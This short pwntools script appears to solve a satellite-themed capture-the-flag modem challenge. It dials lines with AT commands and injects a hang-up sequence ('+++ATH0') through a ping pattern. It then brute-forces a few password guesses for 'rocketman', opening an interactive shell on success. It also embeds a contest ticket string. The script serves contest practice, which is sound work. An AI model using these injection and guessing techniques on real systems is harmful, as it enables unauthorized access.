from pwn import *
ticket = 'ticket{kilo6136kilo:GIoWY3wu40IndlAWHwrIX7-bL3bBqS85chrTyieh48rDb3bFcHoWjM64xzAU40V4ww}'
r = remote('modem.satellitesabove.me', 5052)

def setup():
	r.sendline(ticket)
	r.recvuntil('/dev/ttyACM0')
	r.sendline('ATD3395550101')
	r.recvuntil('Username:')
	r.sendline('hax')
	r.recvuntil('Password:')
	r.sendline('hunter2')
	r.recvuntil('fakesh-4.4$')
	r.sendline('ping -p 2b2b2b415448300d0a 93.184.216.34')
	r.recvuntil('fakesh-4.4$')
	r.sendline('exit')
	r.recvuntil('NO CARRIER')

def force(u, p, debug=False):
	r.sendline('ATD4125550122')
	r.recvuntil('Username:')
	r.sendline(u)
	r.recvuntil('Password:')
	r.sendline(p)
	r.recvline() # consume line
	l = r.recvline()
	if b'AUTHORIZATION FAILURE' not in l or debug is True:
		print(u)
		print(p)
		r.interactive()
	else:
		print(l)
		print(r.recvuntil('NO CARRIER'))
		return

setup()
force('rocketman', '9310')
force('rocketman', '9301')
force('rocketman', '9310F')
force('rocketman', '9301F')
